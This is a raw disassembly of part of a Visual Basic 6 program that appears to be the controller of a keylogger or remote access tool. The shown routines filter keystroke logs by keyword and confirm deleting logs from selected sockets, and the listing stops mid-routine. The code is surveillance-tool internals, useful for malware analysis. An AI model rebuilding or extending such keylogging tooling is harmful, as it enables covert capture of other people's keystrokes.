0074B4DF: mov var_04, 00000004h
0074B4E6: mov var_000000C4, 80020004h
0074B4F0: mov var_000000CC, 0000000Ah
0074B4FA: mov var_000000B4, 80020004h
0074B504: mov var_000000BC, 0000000Ah
0074B50E: mov var_000000A4, 80020004h
0074B518: mov var_000000AC, 0000000Ah
0074B522: mov var_00000094, 80020004h
0074B52C: mov var_0000009C, 0000000Ah
0074B536: mov var_00000084, 80020004h
0074B540: mov var_0000008C, 0000000Ah
0074B54A: mov var_000000E8, 0044BA4Ch ; Filtered keylog
0074B554: mov var_000000F0, 00000008h
0074B55E: lea edx, var_000000F0
0074B564: lea ecx, var_7C
0074B567: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074B56C: mov var_000000D8, 0044BA70h ; Total number of charactes to include after the keyword
0074B576: mov var_000000E0, 00000008h
0074B580: lea edx, var_000000E0
0074B586: lea ecx, var_6C
0074B589: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074B58E: lea eax, var_000000CC
0074B594: push eax
0074B595: lea eax, var_000000BC
0074B59B: push eax
0074B59C: lea eax, var_000000AC
0074B5A2: push eax
0074B5A3: lea eax, var_0000009C
0074B5A9: push eax
0074B5AA: lea eax, var_0000008C
0074B5B0: push eax
0074B5B1: lea eax, var_7C
0074B5B4: push eax
0074B5B5: lea eax, var_6C
0074B5B8: push eax
0074B5B9: call 00410994h ; InputBox
0074B5BE: mov edx, eax
0074B5C0: lea ecx, var_38
0074B5C3: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074B5C8: push eax
0074B5C9: call 004109DCh ; Val(arg_1)
0074B5CE: call 00410814h ; msvbvm60.dll.__vbaFpI4
0074B5D3: mov var_34, eax
0074B5D6: lea ecx, var_38
0074B5D9: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074B5DE: lea eax, var_000000CC
0074B5E4: push eax
0074B5E5: lea eax, var_000000BC
0074B5EB: push eax
0074B5EC: lea eax, var_000000AC
0074B5F2: push eax
0074B5F3: lea eax, var_0000009C
0074B5F9: push eax
0074B5FA: lea eax, var_0000008C
0074B600: push eax
0074B601: lea eax, var_7C
0074B604: push eax
0074B605: lea eax, var_6C
0074B608: push eax
0074B609: push 00000007h
0074B60B: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074B610: add esp, 00000020h
0074B613: mov var_04, 00000006h
0074B61A: mov var_000000D8, 00000001h
0074B624: mov var_000000E0, 00000002h
0074B62E: push 004412BCh
0074B633: push 00000000h
0074B635: push 00000007h
0074B637: mov eax, [ebp+08h]
0074B63A: mov eax, [eax]
0074B63C: push [ebp+08h]
0074B63F: call [eax+0000032Ch]
0074B645: push eax
0074B646: lea eax, var_54
0074B649: push eax
0074B64A: call 00410A84h ; Set (object)
0074B64F: push eax
0074B650: lea eax, var_6C
0074B653: push eax
0074B654: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074B659: add esp, 00000010h
0074B65C: push eax
0074B65D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074B662: push eax
0074B663: lea eax, var_58
0074B666: push eax
0074B667: call 00410A84h ; Set (object)
0074B66C: mov var_00000150, eax
0074B672: lea eax, var_00000144
0074B678: push eax
0074B679: mov eax, var_00000150
0074B67F: mov eax, [eax]
0074B681: push var_00000150
0074B687: call [eax+1Ch]
0074B68A: fclex 
0074B68C: mov var_00000154, eax
0074B692: cmp var_00000154, 00000000h
0074B699: jnl 74B6BBh
0074B69B: push 0000001Ch
0074B69D: push 004412BCh
0074B6A2: push var_00000150
0074B6A8: push var_00000154
0074B6AE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074B6B3: mov var_0000019C, eax
0074B6B9: jmp 74B6C2h
0074B6BB: and var_0000019C, 00000000h
0074B6C2: mov eax, var_00000144
0074B6C8: mov var_000000E8, eax
0074B6CE: mov var_000000F0, 00000003h
0074B6D8: mov var_000000F8, 00000001h
0074B6E2: mov var_00000100, 00000002h
0074B6EC: lea eax, var_000000E0
0074B6F2: push eax
0074B6F3: lea eax, var_000000F0
0074B6F9: push eax
0074B6FA: lea eax, var_00000100
0074B700: push eax
0074B701: lea eax, var_00000180
0074B707: push eax
0074B708: lea eax, var_00000170
0074B70E: push eax
0074B70F: lea eax, var_30
0074B712: push eax
0074B713: call 00410A3Ch ; For
0074B718: mov var_00000198, eax
0074B71E: lea eax, var_58
0074B721: push eax
0074B722: lea eax, var_54
0074B725: push eax
0074B726: push 00000002h
0074B728: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074B72D: add esp, 0000000Ch
0074B730: lea ecx, var_6C
0074B733: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074B738: jmp 0074B977h
0074B73D: mov var_04, 00000007h
0074B744: push 004412BCh
0074B749: push 00000000h
0074B74B: push 00000007h
0074B74D: mov eax, [ebp+08h]
0074B750: mov eax, [eax]
0074B752: push [ebp+08h]
0074B755: call [eax+0000032Ch]
0074B75B: push eax
0074B75C: lea eax, var_54
0074B75F: push eax
0074B760: call 00410A84h ; Set (object)
0074B765: push eax
0074B766: lea eax, var_6C
0074B769: push eax
0074B76A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074B76F: add esp, 00000010h
0074B772: push eax
0074B773: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074B778: push eax
0074B779: lea eax, var_58
0074B77C: push eax
0074B77D: call 00410A84h ; Set (object)
0074B782: mov var_00000150, eax
0074B788: lea eax, var_5C
0074B78B: push eax
0074B78C: lea eax, var_30
0074B78F: push eax
0074B790: mov eax, var_00000150
0074B796: mov eax, [eax]
0074B798: push var_00000150
0074B79E: call [eax+24h]
0074B7A1: fclex 
0074B7A3: mov var_00000154, eax
0074B7A9: cmp var_00000154, 00000000h
0074B7B0: jnl 74B7D2h
0074B7B2: push 00000024h
0074B7B4: push 004412BCh
0074B7B9: push var_00000150
0074B7BF: push var_00000154
0074B7C5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074B7CA: mov var_000001A0, eax
0074B7D0: jmp 74B7D9h
0074B7D2: and var_000001A0, 00000000h
0074B7D9: mov eax, var_5C
0074B7DC: mov var_00000158, eax
0074B7E2: lea eax, var_38
0074B7E5: push eax
0074B7E6: push 00000005h
0074B7E8: mov eax, var_00000158
0074B7EE: mov eax, [eax]
0074B7F0: push var_00000158
0074B7F6: call [eax+00000084h]
0074B7FC: fclex 
0074B7FE: mov var_0000015C, eax
0074B804: cmp var_0000015C, 00000000h
0074B80B: jnl 74B830h
0074B80D: push 00000084h
0074B812: push 004412DCh
0074B817: push var_00000158
0074B81D: push var_0000015C
0074B823: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074B828: mov var_000001A4, eax
0074B82E: jmp 74B837h
0074B830: and var_000001A4, 00000000h
0074B837: push var_38
0074B83A: push 0044BAE4h ; 100%
0074B83F: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0074B844: neg eax
0074B846: sbb eax, eax
0074B848: inc eax
0074B849: neg eax
0074B84B: mov var_00000160, ax
0074B852: lea ecx, var_38
0074B855: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074B85A: lea eax, var_5C
0074B85D: push eax
0074B85E: lea eax, var_58
0074B861: push eax
0074B862: lea eax, var_54
0074B865: push eax
0074B866: push 00000003h
0074B868: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074B86D: add esp, 00000010h
0074B870: lea ecx, var_6C
0074B873: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074B878: movsx eax, word ptr var_00000160
0074B87F: test eax, eax
0074B881: jz 0074B953h
0074B887: mov var_04, 00000008h
0074B88E: push 004412BCh
0074B893: push 00000000h
0074B895: push 00000007h
0074B897: mov eax, [ebp+08h]
0074B89A: mov eax, [eax]
0074B89C: push [ebp+08h]
0074B89F: call [eax+0000032Ch]
0074B8A5: push eax
0074B8A6: lea eax, var_54
0074B8A9: push eax
0074B8AA: call 00410A84h ; Set (object)
0074B8AF: push eax
0074B8B0: lea eax, var_6C
0074B8B3: push eax
0074B8B4: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074B8B9: add esp, 00000010h
0074B8BC: push eax
0074B8BD: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074B8C2: push eax
0074B8C3: lea eax, var_58
0074B8C6: push eax
0074B8C7: call 00410A84h ; Set (object)
0074B8CC: mov var_00000150, eax
0074B8D2: lea edx, var_30
0074B8D5: lea ecx, var_7C
0074B8D8: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0074B8DD: lea eax, var_7C
0074B8E0: push eax
0074B8E1: mov eax, var_00000150
0074B8E7: mov eax, [eax]
0074B8E9: push var_00000150
0074B8EF: call [eax+34h]
0074B8F2: fclex 
0074B8F4: mov var_00000154, eax
0074B8FA: cmp var_00000154, 00000000h
0074B901: jnl 74B923h
0074B903: push 00000034h
0074B905: push 004412BCh
0074B90A: push var_00000150
0074B910: push var_00000154
0074B916: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074B91B: mov var_000001A8, eax
0074B921: jmp 74B92Ah
0074B923: and var_000001A8, 00000000h
0074B92A: lea eax, var_58
0074B92D: push eax
0074B92E: lea eax, var_54
0074B931: push eax
0074B932: push 00000002h
0074B934: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074B939: add esp, 0000000Ch
0074B93C: lea eax, var_7C
0074B93F: push eax
0074B940: lea eax, var_6C
0074B943: push eax
0074B944: push 00000002h
0074B946: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074B94B: add esp, 0000000Ch
0074B94E: jmp 0074B613h
0074B953: mov var_04, 0000000Bh
0074B95A: lea eax, var_00000180
0074B960: push eax
0074B961: lea eax, var_00000170
0074B967: push eax
0074B968: lea eax, var_30
0074B96B: push eax
0074B96C: call 00410A36h ; Next
0074B971: mov var_00000198, eax
0074B977: cmp var_00000198, 00000000h
0074B97E: jnz 0074B73Dh
0074B984: mov var_04, 0000000Ch
0074B98B: and [008F23B8h], 00000000h
0074B992: mov var_04, 0000000Dh
0074B999: fldz 
0074B99B: fstp real8 ptr [008F23BCh]
0074B9A1: mov var_04, 0000000Eh
0074B9A8: fldz 
0074B9AA: fstp real8 ptr [008F23ACh]
0074B9B0: mov var_04, 0000000Fh
0074B9B7: push [008F23B4h]
0074B9BD: push 00000000h
0074B9BF: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0074B9C4: test eax, eax
0074B9C6: jnz 74B9CDh
0074B9C8: jmp 0074BD5Ch
0074B9CD: mov var_04, 00000012h
0074B9D4: cmp var_34, 00000000h
0074B9D8: jnle 74B9DFh
0074B9DA: jmp 0074BD5Ch
0074B9DF: mov var_04, 00000015h
0074B9E6: lea eax, var_38
0074B9E9: push eax
0074B9EA: mov eax, [ebp+08h]
0074B9ED: mov eax, [eax]
0074B9EF: push [ebp+08h]
0074B9F2: call [eax+000001C0h]
0074B9F8: fclex 
0074B9FA: mov var_00000150, eax
0074BA00: cmp var_00000150, 00000000h
0074BA07: jnl 74BA29h
0074BA09: push 000001C0h
0074BA0E: push 00444B74h
0074BA13: push [ebp+08h]
0074BA16: push var_00000150
0074BA1C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074BA21: mov var_000001AC, eax
0074BA27: jmp 74BA30h
0074BA29: and var_000001AC, 00000000h
0074BA30: push var_38
0074BA33: call 004109DCh ; Val(arg_1)
0074BA38: call 00410814h ; msvbvm60.dll.__vbaFpI4
0074BA3D: mov [8F23DCh], eax
0074BA42: lea ecx, var_38
0074BA45: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0074BA4A: mov var_04, 00000016h
0074BA51: lea eax, var_38
0074BA54: push eax
0074BA55: mov eax, [ebp+08h]
0074BA58: mov eax, [eax]
0074BA5A: push [ebp+08h]
0074BA5D: call [eax+000001C0h]
0074BA63: fclex 
0074BA65: mov var_00000150, eax
0074BA6B: cmp var_00000150, 00000000h
0074BA72: jnl 74BA94h
0074BA74: push 000001C0h
0074BA79: push 00444B74h
0074BA7E: push [ebp+08h]
0074BA81: push var_00000150
0074BA87: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074BA8C: mov var_000001B0, eax
0074BA92: jmp 74BA9Bh
0074BA94: and var_000001B0, 00000000h
0074BA9B: push var_38
0074BA9E: call 004109DCh ; Val(arg_1)
0074BAA3: fstp real8 ptr var_0000014C
0074BAA9: cmp [008F2010h], 00000000h
0074BAB0: jnz 74BACDh
0074BAB2: push 008F2010h
0074BAB7: push 00433984h
0074BABC: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074BAC1: mov var_000001B4, 008F2010h
0074BACB: jmp 74BAD7h
0074BACD: mov var_000001B4, 008F2010h
0074BAD7: mov eax, var_000001B4
0074BADD: mov eax, [eax]
0074BADF: mov ecx, var_000001B4
0074BAE5: mov ecx, [ecx]
0074BAE7: mov ecx, [ecx]
0074BAE9: push eax
0074BAEA: call [ecx+00000524h]
0074BAF0: push eax
0074BAF1: lea eax, var_54
0074BAF4: push eax
0074BAF5: call 00410A84h ; Set (object)
0074BAFA: mov var_00000154, eax
0074BB00: lea eax, var_58
0074BB03: push eax
0074BB04: fld real8 ptr var_0000014C
0074BB0A: call 004108E6h ; msvbvm60.dll.__vbaFpI2
0074BB0F: push eax
0074BB10: mov eax, var_00000154
0074BB16: mov eax, [eax]
0074BB18: push var_00000154
0074BB1E: call [eax+40h]
0074BB21: fclex 
0074BB23: mov var_00000158, eax
0074BB29: cmp var_00000158, 00000000h
0074BB30: jnl 74BB52h
0074BB32: push 00000040h
0074BB34: push 00440DE8h
0074BB39: push var_00000154
0074BB3F: push var_00000158
0074BB45: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074BB4A: mov var_000001B8, eax
0074BB50: jmp 74BB59h
0074BB52: and var_000001B8, 00000000h
0074BB59: push 00000000h
0074BB5B: push 00000004h
0074BB5D: push var_58
0074BB60: lea eax, var_6C
0074BB63: push eax
0074BB64: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074BB69: add esp, 00000010h
0074BB6C: push 00FF00FFh
0074BB71: push 0044BB20h ; Filtered log  (
0074BB76: push [008F23B4h]
0074BB7C: call 00410A18h ; &
0074BB81: mov edx, eax
0074BB83: lea ecx, var_3C
0074BB86: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074BB8B: push eax
0074BB8C: push 004496A8h
0074BB91: call 00410A18h ; &
0074BB96: mov edx, eax
0074BB98: lea ecx, var_40
0074BB9B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074BBA0: push eax
0074BBA1: push var_34
0074BBA4: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
0074BBA9: mov edx, eax
0074BBAB: lea ecx, var_44
0074BBAE: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074BBB3: push eax
0074BBB4: call 00410A18h ; &
0074BBB9: mov edx, eax
0074BBBB: lea ecx, var_48
0074BBBE: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074BBC3: push eax
0074BBC4: push 0044BB44h ; ) - Single
0074BBC9: call 00410A18h ; &
0074BBCE: mov edx, eax
0074BBD0: lea ecx, var_50
0074BBD3: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074BBD8: push eax
0074BBD9: push 00442864h ; Keylog
0074BBDE: lea eax, var_6C
0074BBE1: push eax
0074BBE2: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0074BBE7: mov edx, eax
0074BBE9: lea ecx, var_4C
0074BBEC: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0074BBF1: push eax
0074BBF2: call 0074FC42h
0074BBF7: lea eax, var_50
0074BBFA: push eax
0074BBFB: lea eax, var_4C
0074BBFE: push eax
0074BBFF: lea eax, var_48
0074BC02: push eax
0074BC03: lea eax, var_44
0074BC06: push eax
0074BC07: lea eax, var_40
0074BC0A: push eax
0074BC0B: lea eax, var_3C
0074BC0E: push eax
0074BC0F: lea eax, var_38
0074BC12: push eax
0074BC13: push 00000007h
0074BC15: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074BC1A: add esp, 00000020h
0074BC1D: lea eax, var_58
0074BC20: push eax
0074BC21: lea eax, var_54
0074BC24: push eax
0074BC25: push 00000002h
0074BC27: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074BC2C: add esp, 0000000Ch
0074BC2F: lea ecx, var_6C
0074BC32: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0074BC37: mov var_04, 00000017h
0074BC3E: lea eax, var_38
0074BC41: push eax
0074BC42: mov eax, [ebp+08h]
0074BC45: mov eax, [eax]
0074BC47: push [ebp+08h]
0074BC4A: call [eax+000001C0h]
0074BC50: fclex 
0074BC52: mov var_00000150, eax
0074BC58: cmp var_00000150, 00000000h
0074BC5F: jnl 74BC81h
0074BC61: push 000001C0h
0074BC66: push 00444B74h
0074BC6B: push [ebp+08h]
0074BC6E: push var_00000150
0074BC74: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0074BC79: mov var_000001BC, eax
0074BC7F: jmp 74BC88h
0074BC81: and var_000001BC, 00000000h
0074BC88: push var_38
0074BC8B: call 004109DCh ; Val(arg_1)
0074BC90: fstp real8 ptr var_0000014C
0074BC96: push 00000000h
0074BC98: push 00000001h
0074BC9A: push 00000001h
0074BC9C: push 00000000h
0074BC9E: lea eax, var_000000D0
0074BCA4: push eax
0074BCA5: push 00000010h
0074BCA7: push 00000880h
0074BCAC: call 00410946h ; ReDim
0074BCB1: add esp, 0000001Ch
0074BCB4: mov var_000000D8, 008F23B4h
0074BCBE: mov var_000000E0, 00004008h
0074BCC8: lea esi, var_000000E0
0074BCCE: push 00000000h
0074BCD0: push var_000000D0
0074BCD6: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074BCDB: mov ecx, eax
0074BCDD: mov edx, esi
0074BCDF: call 00410940h ; msvbvm60.dll.__vbaVarZero
0074BCE4: lea eax, var_34
0074BCE7: mov var_000000E8, eax
0074BCED: mov var_000000F0, 00004003h
0074BCF7: lea esi, var_000000F0
0074BCFD: push 00000001h
0074BCFF: push var_000000D0
0074BD05: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0074BD0A: mov ecx, eax
0074BD0C: mov edx, esi
0074BD0E: call 00410940h ; msvbvm60.dll.__vbaVarZero
0074BD13: mov edx, 0043D54Ch ; x26
0074BD18: lea ecx, var_3C
0074BD1B: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0074BD20: lea eax, var_000000D0
0074BD26: push eax
0074BD27: lea eax, var_3C
0074BD2A: push eax
0074BD2B: fld real8 ptr var_0000014C
0074BD31: call 004108E6h ; msvbvm60.dll.__vbaFpI2
0074BD36: push eax
0074BD37: call 007A6910h
0074BD3C: lea eax, var_000000D0
0074BD42: push eax
0074BD43: push 00000000h
0074BD45: call 00410934h ; Erase
0074BD4A: lea eax, var_3C
0074BD4D: push eax
0074BD4E: lea eax, var_38
0074BD51: push eax
0074BD52: push 00000002h
0074BD54: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074BD59: add esp, 0000000Ch
0074BD5C: mov var_10, 00000000h
0074BD63: wait 
0074BD64: push 0074BE0Fh
0074BD69: jmp 0074BDEEh
0074BD6E: lea eax, var_50
0074BD71: push eax
0074BD72: lea eax, var_4C
0074BD75: push eax
0074BD76: lea eax, var_48
0074BD79: push eax
0074BD7A: lea eax, var_44
0074BD7D: push eax
0074BD7E: lea eax, var_40
0074BD81: push eax
0074BD82: lea eax, var_3C
0074BD85: push eax
0074BD86: lea eax, var_38
0074BD89: push eax
0074BD8A: push 00000007h
0074BD8C: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0074BD91: add esp, 00000020h
0074BD94: lea eax, var_5C
0074BD97: push eax
0074BD98: lea eax, var_58
0074BD9B: push eax
0074BD9C: lea eax, var_54
0074BD9F: push eax
0074BDA0: push 00000003h
0074BDA2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074BDA7: add esp, 00000010h
0074BDAA: lea eax, var_000000CC
0074BDB0: push eax
0074BDB1: lea eax, var_000000BC
0074BDB7: push eax
0074BDB8: lea eax, var_000000AC
0074BDBE: push eax
0074BDBF: lea eax, var_0000009C
0074BDC5: push eax
0074BDC6: lea eax, var_0000008C
0074BDCC: push eax
0074BDCD: lea eax, var_7C
0074BDD0: push eax
0074BDD1: lea eax, var_6C
0074BDD4: push eax
0074BDD5: push 00000007h
0074BDD7: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074BDDC: add esp, 00000020h
0074BDDF: lea eax, var_000000D0
0074BDE5: push eax
0074BDE6: push 00000000h
0074BDE8: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0074BDED: ret 
End Sub

Private sub mnuRaderaLoggMarkerade__74DE98
0074DE98: push ebp
0074DE99: mov ebp, esp
0074DE9B: sub esp, 00000018h
0074DE9E: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0074DEA3: mov eax, fs:[00h]
0074DEA9: push eax
0074DEAA: mov fs:[00000000h], esp
0074DEB1: mov eax, 000000F8h
0074DEB6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074DEBB: push ebx
0074DEBC: push esi
0074DEBD: push edi
0074DEBE: mov var_18, esp
0074DEC1: mov var_14, 00405D60h
0074DEC8: mov eax, [ebp+08h]
0074DECB: and eax, 00000001h
0074DECE: mov var_10, eax
0074DED1: mov eax, [ebp+08h]
0074DED4: and al, FEh
0074DED6: mov [ebp+08h], eax
0074DED9: mov var_0C, 00000000h
0074DEE0: mov eax, [ebp+08h]
0074DEE3: mov eax, [eax]
0074DEE5: push [ebp+08h]
0074DEE8: call [eax+04h]
0074DEEB: mov var_04, 00000001h
0074DEF2: mov var_04, 00000002h
0074DEF9: push FFFFFFFFh
0074DEFB: call 00410A60h ; On Error ...
0074DF00: mov var_04, 00000003h
0074DF07: mov var_7C, 80020004h
0074DF0E: mov var_00000084, 0000000Ah
0074DF18: mov var_6C, 80020004h
0074DF1F: mov var_74, 0000000Ah
0074DF26: mov var_5C, 80020004h
0074DF2D: mov var_64, 0000000Ah
0074DF34: mov var_00000090, 0044BC54h ; Confirm erase
0074DF3E: mov var_00000098, 00000008h
0074DF48: lea edx, var_00000098
0074DF4E: lea ecx, var_54
0074DF51: call 004109E2h ; msvbvm60.dll.__vbaVarDup
0074DF56: lea eax, var_00000084
0074DF5C: push eax
0074DF5D: lea eax, var_74
0074DF60: push eax
0074DF61: lea eax, var_64
0074DF64: push eax
0074DF65: push 00000034h
0074DF67: lea eax, var_54
0074DF6A: push eax
0074DF6B: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
0074DF70: sub eax, 00000007h
0074DF73: neg eax
0074DF75: sbb eax, eax
0074DF77: inc eax
0074DF78: neg eax
0074DF7A: mov var_000000D4, ax
0074DF81: lea eax, var_00000084
0074DF87: push eax
0074DF88: lea eax, var_74
0074DF8B: push eax
0074DF8C: lea eax, var_64
0074DF8F: push eax
0074DF90: lea eax, var_54
0074DF93: push eax
0074DF94: push 00000004h
0074DF96: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074DF9B: add esp, 00000014h
0074DF9E: movsx eax, word ptr var_000000D4
0074DFA5: test eax, eax
0074DFA7: jz 74DFAEh
0074DFA9: jmp 0074E412h
0074DFAE: mov var_04, 00000006h
0074DFB5: push 00FF00FFh
0074DFBA: push 0044BC74h ; Delete log - Selected sockets
0074DFBF: push 00442864h ; Keylog
0074DFC4: push 0044A82Ch
0074DFC9: call 0074FC42h
0074DFCE: mov var_04, 00000007h
0074DFD5: mov var_00000090, 00000001h
0074DFDF: mov var_00000098, 00000002h
0074DFE9: cmp [008F2010h], 00000000h
0074DFF0: jnz 74E00Dh
0074DFF2: push 008F2010h
0074DFF7: push 00433984h
0074DFFC: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074E001: mov var_00000110, 008F2010h
0074E00B: jmp 74E017h
0074E00D: mov var_00000110, 008F2010h
0074E017: push 00000000h
0074E019: push 00000001h
0074E01B: push 00440E48h
0074E020: push 00000000h
0074E022: push 00000018h
0074E024: mov eax, var_00000110
0074E02A: mov eax, [eax]
0074E02C: mov ecx, var_00000110
0074E032: mov ecx, [ecx]
0074E034: mov ecx, [ecx]
0074E036: push eax
0074E037: call [ecx+00000550h]
0074E03D: push eax
0074E03E: lea eax, var_3C
0074E041: push eax
0074E042: call 00410A84h ; Set (object)
0074E047: push eax
0074E048: lea eax, var_54
0074E04B: push eax
0074E04C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074E051: add esp, 00000010h
0074E054: push eax
0074E055: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074E05A: push eax
0074E05B: lea eax, var_40
0074E05E: push eax
0074E05F: call 00410A84h ; Set (object)
0074E064: push eax
0074E065: lea eax, var_64
0074E068: push eax
0074E069: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074E06E: add esp, 00000010h
0074E071: push eax
0074E072: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0074E077: mov var_000000A0, eax
0074E07D: mov var_000000A8, 00000003h
0074E087: mov var_000000B0, 00000001h
0074E091: mov var_000000B8, 00000002h
0074E09B: lea eax, var_00000098
0074E0A1: push eax
0074E0A2: lea eax, var_000000A8
0074E0A8: push eax
0074E0A9: lea eax, var_000000B8
0074E0AF: push eax
0074E0B0: lea eax, var_000000F4
0074E0B6: push eax
0074E0B7: lea eax, var_000000E4
0074E0BD: push eax
0074E0BE: lea eax, var_30
0074E0C1: push eax
0074E0C2: call 00410A3Ch ; For
0074E0C7: mov var_0000010C, eax
0074E0CD: lea eax, var_40
0074E0D0: push eax
0074E0D1: lea eax, var_3C
0074E0D4: push eax
0074E0D5: push 00000002h
0074E0D7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074E0DC: add esp, 0000000Ch
0074E0DF: lea eax, var_64
0074E0E2: push eax
0074E0E3: lea eax, var_54
0074E0E6: push eax
0074E0E7: push 00000002h
0074E0E9: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074E0EE: add esp, 0000000Ch
0074E0F1: jmp 0074E405h
0074E0F6: mov var_04, 00000008h
0074E0FD: lea eax, var_30
0074E100: mov var_00000090, eax
0074E106: mov var_00000098, 0000400Ch
0074E110: cmp [008F2010h], 00000000h
0074E117: jnz 74E134h
0074E119: push 008F2010h
0074E11E: push 00433984h
0074E123: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0074E128: mov var_00000114, 008F2010h
0074E132: jmp 74E13Eh
0074E134: mov var_00000114, 008F2010h
0074E13E: push 00000000h
0074E140: push 00000004h
0074E142: push 00440E58h
0074E147: push 00000010h
0074E149: pop eax
0074E14A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0074E14F: lea esi, var_00000098
0074E155: mov edi, esp
0074E157: movsd 
0074E158: movsd 
0074E159: movsd 
0074E15A: movsd 
0074E15B: push 00000001h
0074E15D: push 00000000h
0074E15F: push 00440E48h
0074E164: push 00000000h
0074E166: push 00000018h
0074E168: mov eax, var_00000114
0074E16E: mov eax, [eax]
0074E170: mov ecx, var_00000114
0074E176: mov ecx, [ecx]
0074E178: mov ecx, [ecx]
0074E17A: push eax
0074E17B: call [ecx+00000550h]
0074E181: push eax
0074E182: lea eax, var_3C
0074E185: push eax
0074E186: call 00410A84h ; Set (object)
0074E18B: push eax
0074E18C: lea eax, var_54
0074E18F: push eax
0074E190: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074E195: add esp, 00000010h
0074E198: push eax
0074E199: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074E19E: push eax
0074E19F: lea eax, var_40
0074E1A2: push eax
0074E1A3: call 00410A84h ; Set (object)
0074E1A8: push eax
0074E1A9: lea eax, var_64
0074E1AC: push eax
0074E1AD: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074E1B2: add esp, 00000020h
0074E1B5: push eax
0074E1B6: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0074E1BB: push eax
0074E1BC: lea eax, var_44
0074E1BF: push eax
0074E1C0: call 00410A84h ; Set (object)
0074E1C5: push eax
0074E1C6: lea eax, var_74
0074E1C9: push eax
0074E1CA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0074E1CF: add esp, 00000010h
0074E1D2: push eax
0074E1D3: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
0074E1D8: sub ax, FFFFh
0074E1DC: neg ax
0074E1DF: sbb eax, eax
0074E1E1: inc eax
0074E1E2: neg eax
0074E1E4: mov var_000000D4, ax
0074E1EB: lea eax, var_44
0074E1EE: push eax
0074E1EF: lea eax, var_40
0074E1F2: push eax
0074E1F3: lea eax, var_3C
0074E1F6: push eax
0074E1F7: push 00000003h
0074E1F9: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0074E1FE: add esp, 00000010h
0074E201: lea eax, var_74
0074E204: push eax
0074E205: lea eax, var_64
0074E208: push eax
0074E209: lea eax, var_54
0074E20C: push eax
0074E20D: push 00000003h
0074E20F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0074E214: add esp, 00000010h
0074E217: movsx eax, word ptr var_000000D4
0074E21E: test eax, eax
0074E220: jz 0074E3E1h
0074E226: mov var_04, 00000009h
0074E22D: lea eax, var_30
0074E230: mov var_00000090, eax
0074E236: mov var_00000098, 0000400Ch
0074E240: cmp [008F2010h], 00000000h
0074E247: jnz 74E264h
0074E249: push 008F2010h
0074E24E: push 00433984h
